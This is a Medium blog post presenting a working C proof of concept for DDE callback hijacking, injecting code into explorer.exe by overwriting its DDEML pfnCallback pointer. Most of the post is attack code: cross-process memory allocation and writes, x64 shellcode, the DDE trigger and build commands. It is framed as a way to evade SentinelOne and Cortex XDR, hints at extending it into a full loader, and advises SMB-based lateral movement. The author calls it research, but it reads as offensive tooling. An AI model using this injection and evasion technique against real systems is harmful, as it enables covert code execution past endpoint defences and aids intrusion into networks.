# https://medium.com/@jaytiwari05/dde-callback-hijacking-a-process-injection-technique-768ad16b1379

[Sitemap](https://medium.com/sitemap/sitemap.xml)

[Open in app](https://play.google.com/store/apps/details?id=com.medium.reader&referrer=utm_source%3DmobileNavBar&source=---top_nav_layout_nav-------------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2F%40jaytiwari05%2Fdde-callback-hijacking-a-process-injection-technique-768ad16b1379&source=post_page---top_nav_layout_nav-----------------------global_nav--------------------)

[Medium Logo](https://medium.com/?source=---top_nav_layout_nav-------------------------------------------)

Get app

[Write](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav--------------------)

[Search](https://medium.com/search?source=---top_nav_layout_nav-------------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2F%40jaytiwari05%2Fdde-callback-hijacking-a-process-injection-technique-768ad16b1379&source=post_page---top_nav_layout_nav-----------------------global_nav--------------------)

![Unknown user](https://miro.medium.com/v2/resize:fill:32:32/1*dmbNkD5D-u45r44go_cf0g.png)

[![Jay Tiwari](https://miro.medium.com/v2/resize:fill:40:40/0*EMeHEX-t2tkSRBwU)](https://medium.com/@jaytiwari05?source=post_page---post_author_sidebar--768ad16b1379-----------------44895bc3872b------------------------)

## Jay Tiwari

Follow writer

[Process Injection](https://medium.com/tag/process-injection?source=post_page---header_tags--768ad16b1379-----------------------------------------)

[Dde](https://medium.com/tag/dde?source=post_page---header_tags--768ad16b1379-----------------------------------------)

[Malware Development](https://medium.com/tag/malware-development?source=post_page---header_tags--768ad16b1379-----------------------------------------)

[Edr Evasion](https://medium.com/tag/edr-evasion?source=post_page---header_tags--768ad16b1379-----------------------------------------)

[Av Evasion](https://medium.com/tag/av-evasion?source=post_page---header_tags--768ad16b1379-----------------------------------------)

# DDE Callback Hijacking -A Process Injection Technique

[![Jay Tiwari](https://miro.medium.com/v2/da:true/resize:fill:32:32/0*EMeHEX-t2tkSRBwU)](https://medium.com/@jaytiwari05?source=post_page---byline--768ad16b1379-----------------------------------------)

[Jay Tiwari](https://medium.com/@jaytiwari05?source=post_page---byline--768ad16b1379-----------------------------------------)

Follow

13 min read

·

Sep 26, 2026

170

[Listen](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2Fplans%3Fdimension%3Dpost_audio_button%26postId%3D768ad16b1379&operation=register&redirect=https%3A%2F%2Fmedium.com%2F%40jaytiwari05%2Fdde-callback-hijacking-a-process-injection-technique-768ad16b1379&source=---header_actions--768ad16b1379---------------------post_audio_button--------------------)

Share

I’m Jay, a student exploring the offensive security space with a focus on red teaming and malware development. I spend my time studying detection mechanisms, researching evasion concepts, and learning how modern security products operate under the hood.

During ODPC I was researching different process-injection and loader techniques. I tested indirect syscalls, stack spoofing, Caro-Kann, Early Cascade, process ghosting, and many more. I also spent time building a UDRL. Those paths taught me a lot about what EDRs actually instrument: remote thread creation, APC delivery, unbacked execute, and call stacks that start at `RtlUserThreadStart` instead of a real module.

I was looking for other ways to drive a loader besides “allocate, write, `CreateRemoteThread`.” A friend name Manikanta \[v31l0x1\] sent me [ring0din’s post on DDE callback hijacking](https://ring0din.github.io/posts/dde-callback-hijacking/). That is where I first saw that explorer’s DDE callback pointer (`pfnCallback`) is a usable execution primitive. The idea clicked immediately: you can still stage code in another process, but you do not have to create a thread to run it.

That execution flow is what I like about this technique. There is no `CreateRemoteThread`, no `NtCreateThreadEx`, no `QueueUserAPC`, and no `SetThreadContext`. You overwrite a function pointer that DDEML already owns. Then you send a normal DDE transaction. `user32` loads `pfnCallback` and calls it on explorer’s existing DDE thread - the same thread that already pumps shell messages. The call stack looks like a DDE callback inside explorer, not like a remote thread that started in private memory.

There was no small, ready-to-read PoC I wanted to keep, so I wrote a C version and put it on GitHub. Later, while I was still working on EDR evasion, I came back to this and paired it with what I had learned. After a lot of debugging I got it working against SentinelOne and Cortex XDR in the ODPC lab. Those are the only two I tested. I do not know how other products behave. Feel free to test it yourself.

This post walks through that C PoC.

The Github Link for the POC : [https://github.com/jaytiwari05/DDE-Callback-Hijack](https://github.com/jaytiwari05/DDE-Callback-Hijack)

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*Aac7KHbHouWVeRuuYs_0wA.png)

## What DDE actually gives you

Dynamic Data Exchange \[DDE\] is old Windows IPC. Two applications agree on a service name and a topic, then exchange data with window messages such as `WM_DDE_INITIATE` and `WM_DDE_EXECUTE`.

Most programs do not send those messages by hand. They use the DDE Management Library (DDEML) in `user32.dll`. An application calls `DdeInitialize` and registers a callback. From that point on, DDEML invokes that callback whenever a transaction arrives.

`explorer.exe` still hosts DDE servers. On a typical desktop it answers `Shell` / `AppProperties` (and often `Folders` / `AppProperties` or `Progman` / `Progman`). That means explorer already has a live `PFNCALLBACK` in a heap structure. DDEML stores it as `pfnCallback`.

The PoC replaces that pointer with a small MessageBox stub, sends one `XTYP_EXECUTE`, then puts the original value back. The dialog is owned by explorer, not by the injector.

This is not Office-macro DDE (`T1559.002`). It is closer to Extra Window Memory injection (`T1055.011`) and to odzhan’s 2019 [Breaking BaDDEr](https://modexp.wordpress.com/2019/08/09/windows-process-injection-breaking-badder/) work: a function pointer that lives in window/heap state, overwritten from another process, then invoked by a legitimate dispatcher.

## Where the callback lives

`DdeInitialize` allocates a per-process **instance struct** on the heap and stores the application’s callback as `pfnCallback`. Every conversation also gets a hidden window (`DDEMLAnsiServer` / `DDEMLUnicodeServer`). Extra window memory at index `0` holds a pointer to the **conversation struct**. That struct points at the instance. The instance holds the function pointer.

```
conversation HWND  (lives in explorer.exe)
        │
        │  GetWindowLongPtr(hwnd, 0)   ← extra window memory, served by win32k
        ▼
 conversation struct  (heap, private page)
        │
        │  typically +0x08
        ▼
 instance struct      (heap, private page)
        │
        │  typically +0x40
        ▼
 pfnCallback  →  shell32.dll  (explorer’s real Shell DDE handler)
```

On current builds the offsets are usually `conv+0x08` and `inst+0x40`. They can move, which is why the PoC scans instead of hardcoding them.

That last field is the whole primitive. `user32` later loads it and calls it through a CFG-guarded indirect call (`DoCallback`) on the **same GUI/DDE thread** that already pumps shell messages. Overwrite those eight bytes, send one `XTYP_EXECUTE`, and explorer calls your address as if it were its own DDE handler.

DDEML also requires the _client_ to register a callback. This PoC never serves data, so the function only returns `NULL`:

```
HDDEDATA CALLBACK NullCallback(UINT a, UINT b, HCONV c, HSZ d, HSZ e,
    HDDEDATA f, ULONG_PTR g, ULONG_PTR h) {
    return NULL;
}
```

## Connect as a DDE client

A conversation is identified by a service and a topic. After `DdeConnect`, `DdeQueryConvInfo` returns the partner HWND. That window belongs to explorer.

```
DWORD inst = 0;
DdeInitialize(&inst, NullCallback, APPCLASS_STANDARD, 0);
```

```
HSZ service = DdeCreateStringHandleA(inst, "Shell", CP_WINANSI);
HSZ topic   = DdeCreateStringHandleA(inst, "AppProperties", CP_WINANSI);
HCONV conv  = DdeConnect(inst, service, topic, NULL);
if (!conv) {
    printf("[-] DdeConnect failed -> try topic: Open / Explore / Folders \n");
    return 1;
}CONVINFO info = { sizeof(info) };
DdeQueryConvInfo(conv, QID_SYNC, &info);
HWND explorerWnd = info.hwndPartner;
```

If `DdeConnect` fails, try `Folders` / `AppProperties` or `Progman` / `Progman`. The conversation has to exist so DDEML creates the server window that we read next.

This step is documented desktop IPC. Explorer already answers those names, so the connect itself is ordinary shell behaviour. It is also what creates the window whose extra bytes leak the heap pointer.

## Recover the heap pointer

`GetWindowLongPtr` can read extra window memory. On a DDE conversation window, index `0` is the conversation-structure pointer.

```
ULONG_PTR convStruct = (ULONG_PTR)GetWindowLongPtr(explorerWnd, 0);
```

That read is serviced by **win32k**. You get the pointer _value_ without `OpenProcess` / `ReadProcessMemory` for this step, so it does not raise the usual process-handle telemetry on its own. Following the pointer still needs a process handle:

```
DWORD pid = 0;
GetWindowThreadProcessId(explorerWnd, &pid);
HANDLE explorer = OpenProcess(
    PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION,
    FALSE, pid);
```

The access mask is only memory read, write, and operate. `PROCESS_CREATE_THREAD` is never requested. From an EDR’s handle-telemetry point of view, this is a writer handle.

## Locate `pfnCallback`

The scan uses two invariants:

- The conversation structure contains a pointer to a **committed private** page (the instance).
- Inside that page, `pfnCallback` points into `user32.dll` **or**`shell32.dll`. Explorer’s Shell DDE callback lives in `shell32`.

`user32.dll` and `shell32.dll` are mapped at the same base in every process for a given boot, so a local `LoadLibrary` is enough to recognize those ranges.

```
int is_heap_pointer(HANDLE proc, ULONG_PTR addr) {
    if (addr < 0x10000 || addr > 0x7FFFFFFFFFFF) return 0;
    MEMORY_BASIC_INFORMATION mbi = {0};
    if (!VirtualQueryEx(proc, (void *)addr, &mbi, sizeof(mbi))) return 0;
    return mbi.State == MEM_COMMIT && mbi.Type == MEM_PRIVATE;
}
```

Then walk every 8-byte slot:

```
int find_offsets(HANDLE proc, ULONG_PTR convStruct, int *off1, int *off2) {
    HMODULE hu32  = LoadLibraryA("user32.dll");
    HMODULE hsh32 = LoadLibraryA("shell32.dll");
    ULONG_PTR u32_start  = (ULONG_PTR)hu32;
    ULONG_PTR u32_end    = u32_start + dll_size(hu32);
    ULONG_PTR sh32_start = (ULONG_PTR)hsh32;
    ULONG_PTR sh32_end   = sh32_start + dll_size(hsh32);
```

```
    BYTE conv_buf[256] = { 0 };
    ReadProcessMemory(proc, (void*)convStruct, conv_buf, sizeof(conv_buf), NULL);    for (int i = 0; i + 8 <= 250; i += 8) {
        ULONG_PTR inst_candidate = *(ULONG_PTR*)(conv_buf + i);
        if (!is_heap_pointer(proc, inst_candidate))
            continue;        BYTE inst_buf[256] = { 0 };
        if (!ReadProcessMemory(proc, (void*)inst_candidate, inst_buf, sizeof(inst_buf), NULL))
            continue;        for (int j = 0; j + 8 <= 256; j += 8) {
            ULONG_PTR cb = *(ULONG_PTR*)(inst_buf + j);
            if ((cb >= u32_start && cb < u32_end) ||
                (cb >= sh32_start && cb < sh32_end)) {
                *off1 = i;
                *off2 = j;
                return 1;
            }
        }
    }
    return 0;
}
```

`off1` is the instance pointer inside the conversation structure. `off2` is `pfnCallback` inside the instance. Both values are read once, and the original callback is saved so it can be restored later:

```
int off1 = -1, off2 = -1;
if (!find_offsets(explorer, convStruct, &off1, &off2))
    return 1;
```

```
ULONG_PTR instStruct = 0;
ReadProcessMemory(explorer, (void*)(convStruct + off1), &instStruct, 8, NULL);ULONG_PTR originalCallback = 0;
ReadProcessMemory(explorer, (void*)(instStruct + off2), &originalCallback, 8, NULL);
```

`originalCallback` is the real `shell32` function. Restoring it is what keeps explorer’s DDE server alive after the hijack.

## Why this is good against EDR

This is the part that matters for detection. SentinelOne (and products like it) do not treat “injection” as a single API call. **Storyline** stitches a story: who opened the process, what access they asked for, who allocated and wrote memory, and how that memory started running.

A typical remote-injection chain that fires in the lab looks like this:

1. `OpenProcess` against a high-value process (`explorer.exe`, `lsass.exe`, browsers) with `PROCESS_CREATE_THREAD` in the access mask
2. Cross-process `VirtualAllocEx` \+ `WriteProcessMemory`, especially when the page is RWX or is flipped RW → RX right after the write
3. Remote thread creation: `CreateRemoteThread` / `NtCreateThreadEx`. Kernel thread-notify (`PsSetCreateThreadNotifyRoutine`) and ETW-TI both see a **new thread in another process**
4. That new thread’s start address sitting in **private, unbacked** memory
5. The call stack for that thread starting at `RtlUserThreadStart` → private page, with no real module on the stack
6. APC injection (`QueueUserAPC` / `NtQueueApcThread`) or thread hijack (`SuspendThread` \+ `SetThreadContext`)
7. A process that is not a debugger, installer, or known injector, doing the above against explorer

If those events line up, Storyline marks it as process injection and the agent kills it. Classic shellcode injection, early-bird APC, and most “threadless” variants that still queue an APC still produce that story. That is what kept getting caught while testing other loaders.

SensorWhat it catches on the classic pathKernel / ETW-TI thread notifyNew thread in another processHooks on `NtCreateThreadEx`Remote thread startHooks on `NtQueueApcThread`APC injectionStart-address checksThread begins in unbacked / private RX memoryCall-stack checks`RtlUserThreadStart` → private page, no moduleHandle telemetry`PROCESS_CREATE_THREAD` against explorerMemory scannersRWX private pages, or RW → RX right after a remote write

## Get Jay Tiwari’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Subscribe

Remember me for faster sign in

This loader never completes that story. The write phase is still there. The **execution half** that Storyline weights most heavily is gone.

## Allocate, copy, then hand execution to DDEML

**Allocate.** A private page in explorer, writable first:

```
PVOID remoteCode = VirtualAllocEx(explorer, NULL, sizeof(shellcode_msg),
    MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
```

**Copy.** The MessageBox stub is written with `WriteProcessMemory`. `MessageBoxA` is patched at runtime because ASLR moves `user32.dll`. The module is at the same base in explorer, so a local `GetProcAddress` is the correct target.

```
FARPROC msgbox = GetProcAddress(GetModuleHandleA("user32.dll"), "MessageBoxA");
*(ULONG_PTR*)(shellcode_msg + 36) = (ULONG_PTR)msgbox;
```

```
WriteProcessMemory(explorer, remoteCode, shellcode_msg, sizeof(shellcode_msg), NULL);
```

**Make it executable.** The page is flipped to RX:

```
DWORD oldProtect;
VirtualProtectEx(explorer, remoteCode, sizeof(shellcode_msg),
    PAGE_EXECUTE_READ, &oldProtect);
```

That RW → RX flip is quieter than leaving RWX. It is still a cross-process protect change.

**Execute.** This is the primitive. An 8-byte write over `pfnCallback`, then a DDE transaction that DDEML would send anyway:

```
ULONG_PTR shellcodeAddr = (ULONG_PTR)remoteCode;
WriteProcessMemory(explorer, (void*)(instStruct + off2), &shellcodeAddr, 8, NULL);
```

```
DdeClientTransaction((LPBYTE)"x", 2, conv, NULL, 0, XTYP_EXECUTE, 30000, NULL);
```

`DdeClientTransaction` with `XTYP_EXECUTE` makes DDEML invoke the **server** callback - the pointer that was just replaced. The payload string `"x"` is unused. It only needs to force the execute path.

From here the control transfer is a DDE window message dispatched through `win32k`, then an indirect call `user32` was already going to make. The stub runs on explorer’s **existing** DDE thread. Kernel thread-notify never sees a foreign process creating a thread in explorer. ETW-TI never sees a remote `NtCreateThreadEx`. There is no APC and no stolen context.

The call stack looks like a DDE callback inside explorer (window message → DDEML → `DoCallback` → stub). SentinelOne sees explorer handling a DDE execute on a thread it already owned.

For `XTYP_EXECUTE`, a return value of `NULL` is valid, so the stub ends with `xor eax, eax` / `ret`. An invalid return can fault the server.

```
unsigned char shellcode_msg[] = {
    0x48, 0x83, 0xEC, 0x28,                         // sub rsp, 0x28
    0x33, 0xC9,                                     // xor ecx, ecx          ; hWnd
    0x48, 0x8D, 0x15, 0x1F, 0x00, 0x00, 0x00,       // lea rdx, [rip+0x1F]   ; text
    0x4C, 0x8D, 0x05, 0x34, 0x00, 0x00, 0x00,       // lea r8,  [rip+0x34]   ; caption
    0x45, 0x33, 0xC9,                               // xor r9d, r9d          ; MB_OK
    0xFF, 0x15, 0x07, 0x00, 0x00, 0x00,             // call [rip+0x07]       ; MessageBoxA
    0x33, 0xC0,                                     // xor eax, eax
    0x48, 0x83, 0xC4, 0x28,                         // add rsp, 0x28
    0xC3,                                           // ret
    // +36  MessageBoxA (patched)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    // +44  body
    'D','D','E',' ','C','a','l','l','b','a','c','k',' ',
    'H','i','j','a','c','k','i','n','g',' ','P','o','C','!','\0',
    // +72  title
    'I','n','j','e','c','t','e','d','!','\0'
};
```

The call is synchronous. When `DdeClientTransaction` returns, the stub has already run, or the 30s timeout fired.

## How each choice breaks the story

**Handle.**`OpenProcess` is `PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION`. The handle itself does not look like “I am about to create a thread over there.”

**Heap leak.** The conversation-struct address comes from `GetWindowLongPtr`. That step is extra window memory, served by the kernel.

**Who calls the code.**`user32` was already going to load `pfnCallback`. After the 8-byte overwrite, that indirect call lands in the stub, on a thread explorer already had.

**Local thread for a real payload.** The C PoC pops a MessageBox on the DDE thread and returns immediately. A longer-running payload cannot stay in `pfnCallback`: that callback has to return quickly or explorer’s DDE thread blocks and the shell UI freezes. The general distinction is between work performed on the callback thread and work performed on a separate thread within explorer. Specific loader and payload implementation details are omitted here.

**Short-lived pointer.** Leaving a foreign function pointer in explorer’s heap is what a later memory scan would notice. Putting `shell32` / `user32` back means the instance struct looks normal after the trigger. The hijack window is: pointer swap → one transaction → restore.

**Encrypted blob.** A payload can be stored in encrypted form rather than embedded as plaintext. The choice of algorithm and the loader’s implementation details are outside the scope of this write-up.

**DDE itself is normal.** Explorer talking DDE is ordinary desktop behaviour. The connect and the `XTYP_EXECUTE` do not form a suspicious parent-child or a new process.

In the ODPC lab, SentinelOne’s injection detections were hanging off that execution half (remote thread, APC, stolen context, `PROCESS_CREATE_THREAD`). A process writing some bytes into explorer, by itself, was not enough to fire.

## What is still visible

This is a split, not invisibility. Sensors that still exist:

- `OpenProcess` with `PROCESS_VM_WRITE | PROCESS_VM_OPERATION` against explorer
- `VirtualAllocEx` \+ `WriteProcessMemory` \+ `VirtualProtectEx` (RW → RX) into explorer
- A private RX page that did not come from an image
- A heap function pointer that briefly does not point into `shell32` / `user32`
- Later memory scans of explorer

Further work could focus on reducing these observable signals to make the activity harder for EDR to detect.

The write phase is the loud part. The execution trigger is the quiet part. That split is why this is useful as a building block.

CFG is worth one honest sentence. The dispatch in `user32` is a guarded indirect call. A page allocated as executable can still be accepted as a CFG target. Arbitrary Code Guard / XFG is the control that actually breaks this class of stub. Same-integrity access to explorer (medium to medium) also still works; UIPI only blocks low to high.

## Restore

The original `pfnCallback` must be put back immediately. Leaving the stub in place would send the next legitimate DDE transaction into memory you no longer own.

```
WriteProcessMemory(explorer, (void*)(instStruct + off2),
    &originalCallback, 8, NULL);
```

```
VirtualFreeEx(explorer, remoteCode, 0, MEM_RELEASE);
DdeDisconnect(conv);
DdeFreeStringHandle(inst, service);
DdeFreeStringHandle(inst, topic);
DdeUninitialize(inst);
CloseHandle(explorer);
```

A console handler restores the pointer if the PoC is interrupted (Ctrl+C, close, logoff) before cleanup runs:

```
BOOL WINAPI EmergencyCleanup(DWORD signal) {
    (void)signal;
    if (g_explorer && g_cbAddr && g_originalCb)
        WriteProcessMemory(g_explorer, (void*)g_cbAddr, &g_originalCb, 8, NULL);
    if (g_explorer && g_remoteCode)
        VirtualFreeEx(g_explorer, g_remoteCode, 0, MEM_RELEASE);
    return FALSE;
}
```

On success, the MessageBox titled `Injected!` is owned by `explorer.exe`, and explorer keeps responding.

## Build

Windows Developer Command Prompt:

```
cl DDE-Callback-Hijack.c /link user32.lib
```

Cross-compile:

```
x86_64-w64-mingw32-gcc DDE-Callback-Hijack.c -o DDE-Callback-Hijack.exe -luser32
```

Run the binary in the same session as explorer.

## A note on explorer.exe

People will say that putting shellcode in `explorer.exe` is bad OPSEC. In the abstract, I get it. Explorer is always running, it is well instrumented, and private executable memory inside it will get looked at. If the plan was to live there forever as the only implant, I would agree.

That is not how I would use this.

On a domain, the first beacon is the hard part. Once you already have a foothold, the next problem is reaching other machines without introducing a protocol nobody expected. At that point this is just a local execution primitive on a host you already own. Pair the callback hijack with SMB for the traffic that actually leaves the box. Domain workstations talk SMB all day: file shares, GPO, SYSVOL, named pipes. Explorer taking part in that is normal. A one-off process with its own HTTPS session to an IP nobody has seen is not.

So I would not park a long-haul C2 inside explorer and call it stealth. I would use this to run code in a process that is supposed to be there, and let the lateral path look like the rest of the domain.

## Closing

What I like about this kind of injection is that you still get to choose how you allocate and copy. That part is up to you. The part that actually matters is how the code starts running. With DDE callback hijacking, it does not start from a thread you created. It starts from a callback DDEML already trusts, on a thread explorer already had.

The C PoC is on GitHub: [https://github.com/jaytiwari05/DDE-Callback-Hijack](https://github.com/jaytiwari05/DDE-Callback-Hijack)

Hint: you need to add something more to complete your objective. This file pops a MessageBox. That is enough to prove the path. It is not the whole loader.

Just for the PoC, here are screenshots from the same technique against SentinelOne and Cortex XDR in the ODPC lab. Reminder: ODPC lab EDRs are not default installs. They are well configured.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*bUnUGYf52LHICwG-2yjv2A.png)

Adaptix C2

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*YS0T_3J82iTaU2kDWdD15g.png)

SentinelOne

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*4rtjJMfdzPzvKLliwb0WDg.png)

Cortex XDR

## References & Credits

- [About Dynamic Data Exchange](https://learn.microsoft.com/en-us/windows/win32/dataxchg/about-dynamic-data-exchange)
- [Windows Process Injection: Breaking BaDDEr](https://modexp.wordpress.com/2019/08/09/windows-process-injection-breaking-badder/)
- [DDE Callback Hijacking](https://ring0din.github.io/posts/dde-callback-hijacking/)
- [MITRE ATT&CK T1055.011 — Extra Window Memory Injection](https://attack.mitre.org/techniques/T1055/011/)

[Process Injection](https://medium.com/tag/process-injection?source=post_page---footer_tags--768ad16b1379-----------------------------------------)

[Dde](https://medium.com/tag/dde?source=post_page---footer_tags--768ad16b1379-----------------------------------------)

[Malware Development](https://medium.com/tag/malware-development?source=post_page---footer_tags--768ad16b1379-----------------------------------------)

[Edr Evasion](https://medium.com/tag/edr-evasion?source=post_page---footer_tags--768ad16b1379-----------------------------------------)

[Av Evasion](https://medium.com/tag/av-evasion?source=post_page---footer_tags--768ad16b1379-----------------------------------------)

[![Jay Tiwari](https://miro.medium.com/v2/resize:fill:48:48/0*EMeHEX-t2tkSRBwU)](https://medium.com/@jaytiwari05?source=post_page---post_author_info--768ad16b1379-----------------------------------------)

[![Jay Tiwari](https://miro.medium.com/v2/resize:fill:64:64/0*EMeHEX-t2tkSRBwU)](https://medium.com/@jaytiwari05?source=post_page---post_author_info--768ad16b1379-----------------------------------------)

Follow

[**Written by Jay Tiwari**](https://medium.com/@jaytiwari05?source=post_page---post_author_info--768ad16b1379-----------------------------------------)

[37 followers](https://medium.com/@jaytiwari05/followers?source=post_page---post_author_info--768ad16b1379-----------------------------------------)

· [28 following](https://medium.com/@jaytiwari05/following?source=post_page---post_author_info--768ad16b1379-----------------------------------------)

Follow

[Help](https://help.medium.com/hc/en-us?source=post_page-----768ad16b1379-----------------------------------------)

[Status](https://status.medium.com/?source=post_page-----768ad16b1379-----------------------------------------)

[About](https://medium.com/about?autoplay=1&source=post_page-----768ad16b1379-----------------------------------------)

[Careers](https://medium.com/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----768ad16b1379-----------------------------------------)

[Press](mailto:pressinquiries@medium.com)

[Blog](https://blog.medium.com/?source=post_page-----768ad16b1379-----------------------------------------)

[Store](https://medium.com/store)

[Privacy](https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----768ad16b1379-----------------------------------------)

[Rules](https://policy.medium.com/medium-rules-30e5502c4eb4?source=post_page-----768ad16b1379-----------------------------------------)

[Terms](https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----768ad16b1379-----------------------------------------)

[Text to speech](https://speechify.com/medium?source=post_page-----768ad16b1379-----------------------------------------)